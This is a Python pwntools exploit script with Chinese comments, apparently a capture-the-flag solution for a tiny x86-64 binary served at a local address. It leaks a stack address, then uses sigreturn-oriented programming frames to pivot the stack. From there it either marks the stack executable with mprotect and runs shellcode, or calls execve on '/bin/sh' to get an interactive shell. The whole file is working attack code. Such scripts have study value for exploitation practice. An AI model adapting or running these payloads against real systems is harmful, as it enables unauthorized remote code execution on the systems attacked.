#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')

syscall_addr = 0x4000be
start_addr = 0x4000b0
set_rsi_rdi_addr = 0x4000b8
shellcode = asm(shellcraft.amd64.linux.sh())

io = remote('172.17.0.3', 10001)

payload = ""
payload += p64(start_addr)			#返回到start重新执行一遍sys_read，利用返回值设置rax = 1，调用sys_write
payload += p64(set_rsi_rdi_addr)	#mov rsi, rsp; mov rdi, rax; syscall; retn，此时相当于执行sys_write(1, rsp, size)
payload += p64(start_addr)			#泄露栈地址之后返回到start，执行下一步操作

io.send(payload)
sleep(3)
io.send(payload[8:8+1])				#利用sys_read读取一个字符，设置rax = 1
stack_addr = u64(io.recv()[8:16]) + 0x100	#从泄露的数据中抽取栈地址
log.info('stack addr = %#x' %(stack_addr))
sleep(3)

def mprotect():	
	#sys_mprotect+ret2shellcode流程	#获取栈地址，在栈上取一块空间，使用SROP调用sys_read更改rsp的值并将后续的攻击代码读到可确定的这块栈内存中，随后调用sys_mprotect将该内存置为RWX，最后返回到start将返回地址和shellcode读取到该栈内存中起shell
	
	#-----------------change stack-------------------

	frame_read = SigreturnFrame()			#设置read的SROP帧
	frame_read.rax = constants.SYS_read
	frame_read.rdi = 0
	frame_read.rsi = stack_addr
	frame_read.rdx = 0x300
	frame_read.rsp = stack_addr				#这个stack_addr地址中的内容就是start地址，SROP执行完后ret跳转到start
	frame_read.rip = syscall_addr
	
	payload = ""
	payload += p64(start_addr)				#返回到start重新执行一遍sys_read，利用返回值设置rax = 0xf，调用sys_sigreturn
	payload += p64(syscall_addr)			#ret到syscall，下接SROP帧，触发SROP
	payload += str(frame_read)
	io.send(payload)
	sleep(3)		
	io.send(payload[8:8+15])				#利用sys_read读取一个字符，设置rax = 0xf，注意不要让payload内容被修改
	sleep(3)

	#-----------------call mprotect------------------
	
	frame_mprotect = SigreturnFrame()		#设置mprotect的SROP帧，用mprotect修改栈内存为RWX
	frame_mprotect.rax = constants.SYS_mprotect
	frame_mprotect.rdi = stack_addr & 0xFFFFFFFFFFFFF000
	frame_mprotect.rsi = 0x1000
	frame_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
	frame_mprotect.rsp = stack_addr
	frame_mprotect.rip = syscall_addr
	
	payload = ""
	payload += p64(start_addr)
	payload += p64(syscall_addr)
	payload += str(frame_mprotect)
	
	io.send(payload)
	sleep(3)
	io.send(payload[8:8+15])
	sleep(3)

	#----------read shellcode and execve-------------
	
	payload = ""						
	payload += p64(stack_addr+0x10)			#ret到stack_addr+0x10，即shellcode所在地址
	payload += asm(shellcraft.amd64.linux.sh())
	io.send(payload)
	sleep(3)
	io.interactive()

def execve():
	#sys_read+sys_execve流程	#获取栈地址，在栈上取一块空间，使用SROP调用sys_read在指定地址读入"/bin/sh\x00"，随后调用sys_execve起shell

	#-----------------change stack-------------------
	
	frame_read = SigreturnFrame()		#设置read的SROP帧，不使用原先的read是因为可以使用SROP同时修改rsp，实现stack pivot
	frame_read.rax = constants.SYS_read
	frame_read.rdi = 0
	frame_read.rsi = stack_addr
	frame_read.rdx = 0x300
	frame_read.rsp = stack_addr
	frame_read.rip = syscall_addr
	
	payload = ""
	payload += p64(start_addr)
	payload += p64(syscall_addr)
	payload += str(frame_read)
	io.send(payload)
	sleep(3)
	io.send(payload[8:8+15])
	sleep(3)	
		
	#-----------------call execve-------------------
	
	frame_execve = SigreturnFrame()			#设置execve的SROP帧，注意计算/bin/sh\x00所在地址
	frame_execve.rax = constants.SYS_execve
	frame_execve.rdi = stack_addr+0x108
	frame_execve.rip = syscall_addr
	
	payload = ""
	payload += p64(start_addr)
	payload += p64(syscall_addr)
	payload += str(frame_execve)
	payload += "/bin/sh\x00"
	io.send(payload)
	sleep(3)
	io.send(payload[8:8+15])
	sleep(3)
	io.interactive()
	
#mprotect()
execve()

